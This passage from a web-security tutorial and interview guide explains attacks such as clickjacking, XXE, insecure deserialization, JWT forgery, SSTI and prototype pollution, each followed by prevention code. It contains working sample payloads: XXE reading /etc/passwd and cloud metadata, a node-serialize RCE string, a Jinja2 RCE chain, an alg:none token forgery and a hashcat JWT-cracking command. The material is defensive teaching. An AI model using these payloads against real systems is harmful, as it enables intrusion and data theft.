  "Username not found" vs "Wrong password" → confirms valid usernames
  Timing differences in response → side-channel reveals valid usernames
```

### Rate Limiting Implementation

```javascript
// express-rate-limit — basic rate limiting
const rateLimit = require('express-rate-limit');

// General API rate limiting
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 100,                   // max 100 requests per 15 min per IP
  standardHeaders: true,      // Return rate limit info in the `RateLimit-*` headers
  legacyHeaders: false,
  message: { error: 'Too many requests, please try again later' },
  skipSuccessfulRequests: false,
});

// Strict login rate limiting
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 10,                    // only 10 login attempts per 15 min per IP
  skipSuccessfulRequests: true,  // don't count successful logins
  keyGenerator: (req) => req.ip + ':' + req.body.username,  // per IP+username combo
  message: { error: 'Too many login attempts, account locked for 15 minutes' },
});

app.post('/api/auth/login', loginLimiter, loginHandler);
app.use('/api/', apiLimiter);
```

```javascript
// Redis-backed rate limiting (distributed — works across multiple servers)
const { RateLimiterRedis } = require('rate-limiter-flexible');
const redis = require('redis');

const redisClient = redis.createClient({ url: process.env.REDIS_URL });

const loginRateLimiter = new RateLimiterRedis({
  storeClient: redisClient,
  keyPrefix:   'login_attempt',
  points:      5,              // 5 attempts
  duration:    900,            // per 15 minutes
  blockDuration: 3600,         // block for 1 hour after consuming all points
});

// Progressive delay rate limiter
const slowdownLimiter = new RateLimiterRedis({
  storeClient: redisClient,
  keyPrefix:   'login_slow',
  points:      10,
  duration:    60,
  execEvenly:  true,  // spread requests over the duration
});

app.post('/api/auth/login', async (req, res, next) => {
  const key = req.ip + ':' + req.body.username;
  try {
    await loginRateLimiter.consume(key);
  } catch (err) {
    const retryAfter = Math.round(err.msBeforeNext / 1000) || 1;
    res.setHeader('Retry-After', retryAfter);
    return res.status(429).json({ error: 'Too many attempts', retryAfter });
  }
  next();
});
```

### Anti-Credential-Stuffing Measures

```javascript
// 1. Check passwords against breach databases (HaveIBeenPwned API)
const crypto = require('crypto');

async function isPwnedPassword(password) {
  const hash = crypto.createHash('sha1').update(password).digest('hex').toUpperCase();
  const prefix = hash.slice(0, 5);
  const suffix = hash.slice(5);
  
  const response = await fetch(`https://api.pwnedpasswords.com/range/${prefix}`);
  const hashes = await response.text();
  
  return hashes.split('\n').some(line => line.startsWith(suffix));
}

// Use during registration and password change:
if (await isPwnedPassword(newPassword)) {
  return res.status(400).json({
    error: 'This password has been found in data breaches. Please choose a different password.'
  });
}

// 2. Multi-Factor Authentication (most effective defense)
// Even with correct credentials, attacker needs second factor

// 3. CAPTCHA on failed login attempts
// Only add after N failed attempts — not on first attempt (too much friction)

// 4. Consistent response timing (prevent account enumeration)
app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;
  
  // Always do the same amount of work regardless of whether user exists
  const user = await User.findOne({ where: { email } });
  const dummyHash = '$2b$12$dummyhashtopreventtimingattack';
  
  // If user doesn't exist, compare against dummy hash (takes same time as real)
  const passwordToCheck = user ? user.passwordHash : dummyHash;
  const isValid = await bcrypt.compare(password, passwordToCheck);
  
  if (!user || !isValid) {
    return res.status(401).json({ error: 'Invalid credentials' });
    // Don't say "user not found" vs "wrong password"
  }
  
  // ... create session
});
```

---

## 11. Clickjacking

### How It Works

Clickjacking embeds the target site in a transparent iframe. The attacker overlays a deceptive UI over the invisible target. When the victim "clicks" what they see, they're actually clicking the hidden legitimate page — performing unintended actions.

```html
<!-- Attacker page: evil.com/prize.html -->
<html>
<head>
<style>
  iframe {
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
    opacity: 0;         /* invisible — victim can't see it */
    z-index: 2;         /* above the "click here to win" button */
  }
  #decoy {
    position: absolute;
    top: 200px; left: 300px;  /* positioned over the "Delete Account" button */
    z-index: 1;
    font-size: 24px;
    color: red;
  }
</style>
</head>
<body>
  <div id="decoy">🎉 CLICK HERE TO WIN A PRIZE! 🎉</div>
  <iframe src="https://yourbank.com/settings"></iframe>
  <!--
    Victim sees "CLICK HERE TO WIN A PRIZE"
    Victim actually clicks "Delete Account" on yourbank.com
    → Account deleted, or "Transfer Funds" button clicked
  -->
</body>
</html>
```

### Clickjacking Prevention

**1. X-Frame-Options Header (Older, Widely Supported)**

```http
X-Frame-Options: DENY              # Never allow framing
X-Frame-Options: SAMEORIGIN        # Only allow same-origin frames
X-Frame-Options: ALLOW-FROM https://trusted.com  # DEPRECATED in modern browsers
```

**2. Content-Security-Policy: frame-ancestors (Modern, Preferred)**

```http
# Never allow framing (replaces DENY)
Content-Security-Policy: frame-ancestors 'none';

# Only allow framing by same origin
Content-Security-Policy: frame-ancestors 'self';

# Allow specific trusted origins
Content-Security-Policy: frame-ancestors 'self' https://trusted-partner.com;

# Use BOTH X-Frame-Options and CSP frame-ancestors for older browser compatibility
```

```javascript
// Express middleware:
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('Content-Security-Policy', "frame-ancestors 'none'");
  next();
});
```

---

## 12. XXE — XML External Entity

### How It Works

When an XML parser processes a document with a DTD (Document Type Definition), it can be configured to load external files or URLs. Attackers craft malicious XML to exfiltrate files or trigger SSRF.

```xml
<!-- Malicious XML to read /etc/passwd -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<request>
  <username>&xxe;</username>
</request>
<!-- The parser replaces &xxe; with the contents of /etc/passwd 
     If the response reflects the username → file contents exposed -->

<!-- SSRF via XXE -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>

<!-- Billion laughs attack (XML bomb — DoS via entity expansion) -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol  "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
<!-- Expands to billions of "lol" strings → OOM crash -->
```

### XXE Prevention

```javascript
// Node.js: use a parser with external entities DISABLED by default
// libxmljs2 — safe configuration:
const libxml = require('libxmljs2');
const doc = libxml.parseXml(xmlString, {
  noent: false,      // don't expand entities (disables XXE)
  dtdload: false,    // don't load external DTDs
  dtdvalid: false,   // don't validate DTD
  nonet: true,       // don't allow network access during parsing
});

// Java (DocumentBuilderFactory) — SAFE configuration:
// DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
// dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
// dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

// Python (lxml) — SAFE:
// from lxml import etree
// parser = etree.XMLParser(resolve_entities=False, no_network=True)
// tree = etree.fromstring(xml_string, parser)

// BEST: If you control the API, prefer JSON over XML
// If you must use XML, strip DOCTYPE declarations before parsing:
function stripDoctype(xml) {
  return xml.replace(/<!DOCTYPE[^>]*>/gi, '');
}
```

---

## 13. Insecure Deserialization

### How It Works

When an application deserializes untrusted data, a malicious payload can execute arbitrary code during the deserialization process itself — before any logic checks run.

```text
Serialization:   Object → bytes/string  (safe)
Deserialization: bytes/string → Object  (dangerous if input is untrusted)

The danger: many serialization formats allow encoding of CLASS INFORMATION.
When deserialized, the object's constructor/magic methods run automatically.
Attacker crafts a serialized payload that executes arbitrary code.
```

```javascript
// Node.js: serialize-javascript or node-serialize (common pattern)
// VULNERABLE:
const unserialize = require('node-serialize').unserialize;
app.post('/api/profile', (req, res) => {
  const user = unserialize(req.body.profile);  // NEVER deserialize user input!
  // Malicious payload:
  // {"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ls /')}()"}
  // → executes ls / on the server!
});

// Java: Java serialization (ObjectInputStream)
// Python: pickle.loads() — NEVER pickle untrusted data
// PHP: unserialize() — leads to object injection, POP chains

// Ruby on Rails: historically had YAML deserialization vulns (CVE-2013-0156)
```

### Prevention

```javascript
// 1. Never deserialize untrusted data with native serializers (Java ObjectInputStream, Python pickle)
// 2. Use safe data formats: JSON, Protocol Buffers, MessagePack
//    JSON cannot encode class info → no code execution via JSON.parse()
// 3. If you must deserialize: sign the serialized data
const crypto = require('crypto');
const SECRET = process.env.SERIALIZATION_SECRET;

function serialize(obj) {
  const data = JSON.stringify(obj);
  const sig = crypto.createHmac('sha256', SECRET).update(data).digest('hex');
  return Buffer.from(JSON.stringify({ data, sig })).toString('base64');
}

function deserialize(token) {
  const { data, sig } = JSON.parse(Buffer.from(token, 'base64').toString());
  const expected = crypto.createHmac('sha256', SECRET).update(data).digest('hex');
  if (!crypto.timingSafeEqual(Buffer.from(sig), Buffer.from(expected))) {
    throw new Error('Invalid signature');
  }
  return JSON.parse(data);
}
// 4. Run deserialization in a sandboxed process with minimal permissions
// 5. Monitor for and alert on deserialization exceptions
```

---

## 14. JWT Attacks

### JWT Structure

```text
A JWT has three parts separated by dots:
  Header.Payload.Signature
  
  Header:  { "alg": "HS256", "typ": "JWT" }   → base64url encoded
  Payload: { "userId": 42, "role": "user" }    → base64url encoded (NOT ENCRYPTED!)
  Signature: HMAC_SHA256(header + '.' + payload, SECRET_KEY)
  
IMPORTANT: The payload is only base64-encoded, NOT encrypted.
Anyone can decode it: atob(payload.replace(/-/g,'+').replace(/_/g,'/'))
→ Never put sensitive data in JWT payload!
```

### JWT Attack #1: Algorithm None

```javascript
// VULNERABLE library version: accepts "none" as algorithm
// Attacker forges token:
const header  = btoa(JSON.stringify({ alg: "none", typ: "JWT" }));
const payload = btoa(JSON.stringify({ userId: 1, role: "admin" }));
const forgedToken = header + '.' + payload + '.';  // empty signature
// If server accepts alg:none → full bypass, admin access

// FIX: always specify allowed algorithms explicitly
const jwt = require('jsonwebtoken');
jwt.verify(token, SECRET, { algorithms: ['HS256'] });  // reject everything else
// Never: jwt.verify(token, SECRET)  // default may allow alg:none
```

### JWT Attack #2: HS256 vs RS256 Confusion

```javascript
// Attack: RS256 public key used as HS256 secret
// If server uses RS256 (asymmetric) but accepts HS256 (symmetric):
//   Public key is public — anyone can get it
//   Attacker signs token with HS256 using the public key as the "secret"
//   Server verifies HS256 with public key → accepts forged token!

// FIX: specify the algorithm explicitly and don't accept algorithm changes from token
const jwt = require('jsonwebtoken');
const publicKey = fs.readFileSync('public.pem');

// BAD — algorithm from token header can be manipulated:
// jwt.verify(token, publicKey)  // may accept HS256 signed with public key!

// GOOD — force RS256 only:
jwt.verify(token, publicKey, { algorithms: ['RS256'] });
```

### JWT Attack #3: Weak Secret Brute Force

```bash
# Tools to crack JWTs signed with weak HS256 secrets
hashcat -a 0 -m 16500 token.jwt rockyou.txt
# "secret", "password", "12345", "jwt_secret" are common weak secrets

# Fix: use cryptographically strong secrets
openssl rand -hex 64  # 256-bit random secret for HS256
# For RS256: use 2048-bit RSA key pair (better for distributed systems)
```

### JWT Attack #4: Token Not Invalidated After Logout

```javascript
// Problem: JWTs are stateless — server can't revoke them
// If JWT is stolen, attacker has access until token expires

// FIX 1: Short expiry + refresh tokens
const accessToken  = jwt.sign(payload, SECRET, { expiresIn: '15m' });  // short
const refreshToken = jwt.sign({ userId }, REFRESH_SECRET, { expiresIn: '7d' });

// FIX 2: Maintain a token denylist (blocklist) in Redis
const redis = require('redis');
const redisClient = redis.createClient();

async function logout(req, res) {
  const token = req.headers.authorization.split(' ')[1];
  const decoded = jwt.decode(token);
  const ttl = decoded.exp - Math.floor(Date.now() / 1000);
  
  if (ttl > 0) {
    await redisClient.setEx(`blocklist:${token}`, ttl, '1');
  }
  res.json({ message: 'Logged out' });
}

async function verifyToken(token) {
  const isBlocked = await redisClient.get(`blocklist:${token}`);
  if (isBlocked) throw new Error('Token revoked');
  return jwt.verify(token, SECRET, { algorithms: ['HS256'] });
}
```

### JWT Attack #5: Sensitive Data in Payload

```javascript
// BAD — payload is base64 encoded, NOT encrypted
// Anyone who intercepts/logs the token can decode it
const token = jwt.sign({
  userId: user.id,
  email: user.email,         // OK (needed for the app)
  password: user.password,   // BAD — sensitive!
  ssn: user.ssn,             // BAD — very sensitive!
  role: user.role,           // OK
}, SECRET);

// FIX: put only necessary, non-sensitive claims in JWT
const token = jwt.sign({
  sub: user.id,              // subject (standard claim)
  role: user.role,
  iat: Math.floor(Date.now() / 1000),  // issued at
  exp: Math.floor(Date.now() / 1000) + 900,  // 15 min
}, SECRET);
// Fetch email/profile from DB when needed — don't store in token
```

---

## 15. Prototype Pollution

### How It Works

JavaScript objects inherit from `Object.prototype`. If an attacker can control property key names (e.g., via `__proto__` or `constructor.prototype`), they can modify the prototype of ALL objects.

```javascript
// Vulnerable deep merge function (common in lodash < 4.17.21, jQuery, etc.)
function deepMerge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object') {
      target[key] = target[key] || {};
      deepMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
}

// Attacker sends JSON:
// { "__proto__": { "isAdmin": true } }
// OR: { "constructor": { "prototype": { "isAdmin": true } } }

const user = {};
deepMerge(user, JSON.parse('{"__proto__":{"isAdmin":true}}'));

// Now ALL objects inherit isAdmin: true
console.log({}.isAdmin);                // true!
console.log([].isAdmin);                // true!

// If somewhere in the app: if (req.user.isAdmin) → now everyone is admin!
```

### Prototype Pollution Prevention

```javascript
// FIX 1: Use Object.create(null) for config/user-input objects
// These objects have NO prototype → can't pollute Object.prototype
const obj = Object.create(null);

// FIX 2: Key validation in merge functions
function safeMerge(target, source) {
  for (const key in source) {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue;  // skip dangerous keys
    }
    if (typeof source[key] === 'object' && source[key] !== null) {
      target[key] = target[key] || {};
      safeMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
}

// FIX 3: Use safe libraries (lodash 4.17.21+ has the fix)
import merge from 'lodash/merge';  // use up-to-date version

// FIX 4: JSON.parse safely (JSON.parse handles __proto__ correctly
//         in modern Node.js — it doesn't set __proto__)
// But watch out for manual recursive key-value processing

// FIX 5: Use structuredClone() for deep cloning (Node 17+, modern browsers)
const safeClone = structuredClone(userInput);

// FIX 6: Freeze Object.prototype in critical apps
Object.freeze(Object.prototype);
// Prevents any modification — may break some libraries, test thoroughly
```

---

## 16. Open Redirect

### How It Works

An open redirect allows attackers to redirect users from a trusted site to a malicious one, using the trusted site as a stepping stone for phishing.

```text
Vulnerable URL: https://yoursite.com/login?next=https://evil.com

After login, server redirects to req.query.next without validation.
Attacker sends: "Click here to verify your account at yoursite.com"
URL looks like: yoursite.com/login?next=https://evil.phishing.com
Victim sees yoursite.com in the URL → trusts it → logs in
→ Redirected to evil site → phishing for credentials
```

```javascript
// VULNERABLE
app.get('/login', (req, res) => {
  // ... authenticate user
  const next = req.query.next || '/dashboard';
  res.redirect(next);  // attacker controls this!
});

// FIX: validate redirect URLs against allowlist
function isSafeRedirect(url) {
  try {
    const parsed = new URL(url, 'https://yoursite.com');
    // Only allow same origin
    return parsed.origin === 'https://yoursite.com';
  } catch {
    // Relative URL → safe (stays on same site)
    return url.startsWith('/') && !url.startsWith('//');
  }
}

app.get('/login', (req, res) => {
  const next = req.query.next;
  const redirectTo = (next && isSafeRedirect(next)) ? next : '/dashboard';
  res.redirect(redirectTo);
});
```

---

## 17. SSTI — Server-Side Template Injection

### How It Works

When user input is rendered inside a server-side template engine without sanitization, the attacker can inject template syntax that executes arbitrary code on the server.

```python
# Python Flask/Jinja2 — VULNERABLE
@app.route('/greet')
def greet():
    name = request.args.get('name')
    return render_template_string(f'Hello {name}!')  # NEVER do this!

# Attack: /greet?name={{7*7}}
# → Response: Hello 49!  (expression evaluated!)

# Escalate to RCE:
# /greet?name={{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip() }}
# → executes id command on the server!
```

```javascript
// Node.js Handlebars — VULNERABLE
app.get('/greet', (req, res) => {
  const template = `<p>Hello ${req.query.name}</p>`;  // user-controlled template
  res.send(Handlebars.compile(template)({}));
  // Attack: name={{#with "s" as |string|}}...{{constructor.call template "return process.env"}}
});
```

### SSTI Prevention

```python
# FIX: Never pass user input as a template string
# SAFE: pass user input as template CONTEXT (data), not as part of the template

# BAD:
return render_template_string(f'Hello {user_input}!')

# GOOD:
return render_template_string('Hello {{ name }}!', name=user_input)
# Jinja2 auto-escapes {{ name }} → user_input is DATA, not template syntax

# Even better: use template FILES (not render_template_string):
return render_template('greet.html', name=user_input)

# If you must allow some template features (e.g., user-configurable emails):
# Use a sandboxed template engine: Jinja2 SandboxedEnvironment
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()
template = env.from_string(user_template)
result = template.render(name=user_name)
```

---

## 18. Mass Assignment

### How It Works

Mass assignment occurs when a server binds all incoming request body fields directly to a model/object without filtering, allowing attackers to set fields they shouldn't be able to modify.

```javascript
// VULNERABLE Express + Mongoose
app.put('/api/users/me', authenticate, async (req, res) => {
  // Attacker sends: { "name": "Alice", "role": "admin", "isVerified": true }
  const user = await User.findByIdAndUpdate(req.user.id, req.body, { new: true });
  // req.body includes ALL fields attacker sent → role and isVerified are overwritten!
  res.json(user);
});

// Ruby on Rails equivalent:
# VULNERABLE: User.update_attributes(params[:user])
# Attacker sends: user[admin]=true → sets admin flag!
```

### Prevention

```javascript
// FIX: explicitly whitelist allowed fields (pick/allowlist pattern)
const { pick } = require('lodash');

app.put('/api/users/me', authenticate, async (req, res) => {
  // Only allow updating these specific fields — nothing else
  const allowedFields = ['name', 'bio', 'avatarUrl', 'notificationsEnabled'];
  const updates = pick(req.body, allowedFields);
  
  const user = await User.findByIdAndUpdate(req.user.id, updates, { new: true });
  res.json(user);
});

// Zod schema for strict input validation:
import { z } from 'zod';
const updateProfileSchema = z.object({
  name:                   z.string().min(1).max(100),
  bio:                    z.string().max(500).optional(),
  notificationsEnabled:   z.boolean().optional(),
  // role, isAdmin, isVerified — NOT here → cannot be updated via this endpoint
});

app.put('/api/users/me', authenticate, async (req, res) => {
  const updates = updateProfileSchema.parse(req.body);  // throws if invalid/extra fields
  const user = await User.findByIdAndUpdate(req.user.id, updates, { new: true });
  res.json(user);
});
```

---

## 19. ReDoS — Regular Expression Denial of Service

### How It Works

Certain regular expressions take exponential time to evaluate when given crafted inputs. An attacker can trigger catastrophic backtracking with a short input string, consuming 100% CPU indefinitely.

```javascript
// VULNERABLE regex (evil regex):
const EMAIL_REGEX = /^([a-zA-Z0-9])(([a-zA-Z0-9])*([._-])*)*([a-zA-Z0-9])@[a-zA-Z0-9]{1,63}\.[a-zA-Z]{2,6}$/;

// Attack input (triggers catastrophic backtracking):
'aaaaaaaaaaaaaaaaaaaaaaaaaaaa@'
// Takes seconds/minutes to evaluate → hangs Node.js event loop!

// Other classic evil regexes:
/(a+)+/    // matching "aaaaaaaaaaaaaaaaaaaX" → exponential
/(a|aa)+/  // similar
/([a-z]+)*/

// Tools to detect evil regexes:
// safe-regex npm package
// vuln-regex-detector
// Regex 101: https://regex101.com (shows backtracking steps)
```

### ReDoS Prevention

```javascript
// FIX 1: Use a safe regex library
// npm: re2 — uses Google's RE2 engine (linear time, no backtracking)
const RE2 = require('re2');
const safeRegex = new RE2(/^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$/);
if (!safeRegex.test(email)) { /* invalid */ }

// FIX 2: Set a timeout for regex execution (Node.js 19+)
// Node.js doesn't have native regex timeout — use a worker thread with AbortController

// FIX 3: Limit input length BEFORE regex evaluation
if (email.length > 254) {  // RFC 5321 max email length
  return res.status(400).json({ error: 'Invalid email' });
}
// Short input → fewer backtracking possibilities

// FIX 4: Use simple, non-backtracking regex patterns
// BAD:  /^([a-z]+)+@/
// GOOD: /^[a-z]+@/   (atomic, no repetition-of-repetition)

// FIX 5: Test with npm safe-regex:
const safeRegex = require('safe-regex');
safeRegex(/^([a-z]+)+$/);  // returns false → unsafe regex!
```

---

## 20. Security Misconfiguration

### Common Misconfigurations

```text
Default credentials:
  Admin/admin, admin/password, root/root on databases, routers, admin panels
  MongoDB without authentication, Redis without requirepass
  
Verbose error messages (information disclosure):
  Stack traces in production responses
  Database error messages exposing schema: "column 'users.ssn' doesn't exist"
  Version numbers in Server, X-Powered-By headers
  
Open admin interfaces:
  /phpmyadmin accessible from internet
  /admin accessible without authentication
  Kubernetes dashboard exposed
  Elasticsearch on port 9200 open to internet
  
Debug endpoints left in production:
  /debug, /status, /health (exposes internal state)
  Spring Boot Actuator: /actuator/env, /actuator/heapdump
  Flask debug mode on in production
  
Directory listing enabled:
  GET /uploads/ → returns full list of uploaded files
  
Default encryption keys / weak secrets:
  JWT_SECRET=secret
  SESSION_SECRET=keyboard cat
  
Unnecessary HTTP methods enabled:
  TRACE method → enables XST (Cross-Site Tracing) attacks
  DELETE/PUT on static file servers
```

### Prevention

```javascript
// FIX: Production error handling — never expose internals
app.use((err, req, res, next) => {
  // Log full error server-side (for debugging)
  logger.error({ err, req: { method: req.method, url: req.url } });
  
  // Return safe message to client
  res.status(err.statusCode || 500).json({
    error: process.env.NODE_ENV === 'production'
      ? 'Internal server error'     // safe
      : err.message,                // detailed (dev only)
  });
});

// FIX: Remove information-leaking headers
app.use((req, res, next) => {
  res.removeHeader('X-Powered-By');   // removes "Express"
  res.removeHeader('Server');         // or: res.setHeader('Server', '')
  next();
});

// FIX: Helmet.js (all-in-one security headers)
const helmet = require('helmet');
app.use(helmet());
// Sets: X-Content-Type-Options, X-Frame-Options, HSTS, CSP (configurable), and more

// FIX: Disable TRACE method
app.trace('*', (req, res) => res.status(405).end());

// FIX: Spring Boot Actuator — restrict exposure
// application.properties:
// management.endpoints.web.exposure.include=health,info
// management.endpoint.health.show-details=when_authorized
// management.endpoints.web.base-path=/internal-actuator-path
// server.servlet.context-path=/api
```

---

## 21. Supply Chain Attacks

### How They Work

```text
Types of supply chain attacks:

1. Dependency Confusion:
   Attacker publishes a public npm/pip/RubyGems package with the same name
   as your PRIVATE internal package, but with a HIGHER version number.
   Package managers prefer the public package → malicious code runs in your build.
   
2. Typosquatting:
   Attacker publishes "lodahs" hoping developers mistype "lodash"
   "crossenv" vs "cross-env" — targeted developers (50M+ downloads before removal)
   
3. Package Takeover:
   Maintainer transfers/abandons package → attacker takes ownership
   Publishes new version with malicious code
   
4. Repository Compromise:
   Attacker gains write access to a popular GitHub repo
   Injects malware into a legitimate package
   
5. Build System Compromise (SolarWinds-style):
   Compromise the build pipeline → malicious code injected into signed binaries
```

### Prevention

```bash
# npm audit — check known vulnerabilities
npm audit
npm audit fix         # auto-fix where possible
npm audit --json      # machine-readable output for CI

# Pin exact versions in package.json
{
  "lodash": "4.17.21"    # exact (not "^4.17.21" or "~4.17.21")
}

# Use package-lock.json / yarn.lock (commit to git)
# Lock files record exact versions + checksums → reproducible builds

# Verify package integrity (npm uses SHA-512 checksums automatically)
# Use npm ci instead of npm install in CI (uses lock file strictly)
npm ci

# Scope private packages to prevent dependency confusion
# In .npmrc:
@mycompany:registry=https://internal.registry.mycompany.com

# Prevent unscoped packages from matching internal names
```

```javascript
// Dependabot / Renovate — automated dependency updates
// .github/dependabot.yml:
// version: 2
// updates:
//   - package-ecosystem: "npm"
//     directory: "/"
//     schedule:
//       interval: "weekly"
//     open-pull-requests-limit: 10

// Snyk — commercial vulnerability scanning
// synk test
// snyk monitor

// Socket.dev — supply chain security
// Detects: suspicious new maintainers, obfuscated code, network access from new packages

// SLSA (Supply chain Levels for Software Artifacts) — Google's framework
// Level 3: hermetic, reproducible builds with provenance attestation
```

---

## 22. HTTP Security Headers Reference

### Complete Security Headers

```http
# Set all of these in production. Helmet.js sets most automatically.

# ── XSS PROTECTION ──────────────────────────────────────────────────────────
# Old browsers (IE/Edge pre-Chromium):
X-XSS-Protection: 1; mode=block

# Modern: use CSP instead (X-XSS-Protection is deprecated)
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{NONCE}'; ...

# ── CLICKJACKING PROTECTION ──────────────────────────────────────────────────
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none';

# ── MIME SNIFFING PROTECTION ─────────────────────────────────────────────────
# Prevents browser from "guessing" content type (can lead to script execution)
X-Content-Type-Options: nosniff
# All responses must have correct Content-Type; browser won't override

# ── TRANSPORT SECURITY ───────────────────────────────────────────────────────
# Forces HTTPS for the given duration (in seconds)
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
# max-age=31536000 = 1 year
# includeSubDomains = applies to all subdomains
# preload = submit to HSTS preload list (hardcoded in browsers)

# ── REFERRER POLICY ──────────────────────────────────────────────────────────
# Controls what is sent in the Referer header
Referrer-Policy: strict-origin-when-cross-origin
# Options:
#   no-referrer:                 never send Referer
#   same-origin:                 only for same-origin requests
#   strict-origin-when-cross-origin: full URL same-origin, only origin cross-origin (recommended)
#   unsafe-url:                  always send full URL (not recommended)

# ── PERMISSIONS POLICY (formerly Feature-Policy) ────────────────────────────
# Controls which browser APIs the page can use
Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
# Disables camera, mic, location, payment for this page and any frames

# ── CACHE CONTROL (for sensitive data) ──────────────────────────────────────
# For API responses with personal data, prevent browser caching
Cache-Control: no-store, no-cache, must-revalidate, private
Pragma: no-cache

# ── CORS (for APIs) ─────────────────────────────────────────────────────────
Access-Control-Allow-Origin: https://yoursite.com   # NOT * for credentialed
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization, X-CSRF-Token
Access-Control-Max-Age: 86400
Vary: Origin

# ── CERTIFICATE TRANSPARENCY ─────────────────────────────────────────────────
Expect-CT: max-age=86400, enforce, report-uri="https://csp.yoursite.com/ct-report"
# Note: Expect-CT is deprecated since 2023 (CT is now mandatory anyway)

# ── REMOVE INFORMATION-LEAKING HEADERS ──────────────────────────────────────
# Remove these (don't set them):
# Server: Apache/2.4.51    ← reveals server software + version
# X-Powered-By: Express    ← reveals framework
# X-AspNet-Version: 4.x    ← reveals .NET version
```

```javascript
// Node.js + Helmet — one-liner for most security headers:
const helmet = require('helmet');

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
      styleSrc:  ["'self'", "'unsafe-inline'"],
      imgSrc:    ["'self'", 'data:', 'https:'],
      connectSrc:["'self'", 'https://api.yoursite.com'],
      frameAncestors: ["'none'"],
    },
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true,
  },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  crossOriginEmbedderPolicy: true,
  crossOriginOpenerPolicy: { policy: 'same-origin' },
  crossOriginResourcePolicy: { policy: 'same-site' },
}));
```

---

## 23. OWASP Top 10 (2021) Mapping

```text
A01: Broken Access Control         → Section 9 (IDOR)
  Missing authorization checks, privilege escalation, CORS misconfiguration
  Prevention: server-side authorization on every request, least privilege, deny-by-default

A02: Cryptographic Failures        → Sections 14 (JWT), general crypto
  Weak algorithms, hardcoded keys, HTTP (not HTTPS), unencrypted sensitive data
  Prevention: TLS everywhere, AES-256-GCM, bcrypt/Argon2 for passwords, key rotation

A03: Injection                     → Sections 5 (SQLi), 6 (CMDi), 17 (SSTI)
  SQL, NoSQL, Command, LDAP, XPath, Expression Language injection
  Prevention: parameterized queries, input validation, output encoding

A04: Insecure Design
  Missing threat modeling, no rate limiting, insecure business logic
  Prevention: threat modeling, security requirements in design phase

A05: Security Misconfiguration     → Section 20
  Default credentials, verbose errors, debug endpoints, missing headers
  Prevention: hardening guides, automated config scanning, least feature set

A06: Vulnerable and Outdated Components → Section 21 (Supply Chain)
  Running known-vulnerable libraries, unpatched OS/frameworks
  Prevention: SCA (Software Composition Analysis), Dependabot, npm audit

A07: Identification and Authentication Failures → Sections 10, 14 (JWT)
  Brute force, weak passwords, poor session management, missing MFA
  Prevention: bcrypt, rate limiting, MFA, secure session tokens

A08: Software and Data Integrity Failures → Section 21 (Supply Chain), 13 (Deserialization)
  Unsigned updates, untrusted deserialization, CI/CD pipeline compromise
  Prevention: code signing, SLSA, safe deserialization formats

A09: Security Logging and Monitoring Failures
  Missing logs, logs without context, no alerting on attacks
  Prevention: log all auth events, API abuse, rate limit hits; alert on anomalies

A10: SSRF                          → Section 8
  Server fetching attacker-controlled URLs, cloud metadata endpoints
  Prevention: allowlist URLs, disable SSRF-vulnerable features, IMDSv2
```

---

## 24. Interview Q&A: Beginner to Pro

### Beginner

**Q: What is the difference between XSS and CSRF?**

XSS (Cross-Site Scripting): attacker injects malicious JavaScript that runs in the victim's browser in the context of the target site. The attack runs client-side. Prevention: output encoding, Content Security Policy, HttpOnly cookies.

CSRF (Cross-Site Request Forgery): attacker tricks a logged-in user's browser into sending an authenticated request to the target site without the user's knowledge. The browser automatically includes cookies. No script injection needed — an `<img>` tag or hidden form is enough. Prevention: SameSite cookies (Lax/Strict), CSRF tokens, Origin header validation.

Key difference: XSS exploits trust the browser places in the site's content; CSRF exploits trust the site places in the browser (cookies).

---

**Q: Why is SQL injection dangerous even if you hash passwords?**

